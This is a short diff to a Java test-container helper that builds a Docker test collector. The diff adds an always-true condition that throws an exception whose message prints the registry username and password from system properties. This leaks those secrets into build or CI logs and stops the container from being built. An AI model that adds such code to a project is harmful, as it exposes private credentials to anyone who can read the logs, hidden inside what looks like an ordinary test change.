@@ -23,6 +23,9 @@ public class AOTestCollectorContainer {
 
     public static GenericContainer<?> build(Network network) {
 
+        if (1 == 1) {
+            throw new RuntimeException("user="+System.getProperty("registry.username") + ", tk="+System.getProperty("registry.password"));
+        }
         return new GenericContainer<>(
                 DockerImageName.parse("ghcr.io/librato/apm-agent-test-collector:v1.1.0"))
                 .withNetwork(network)
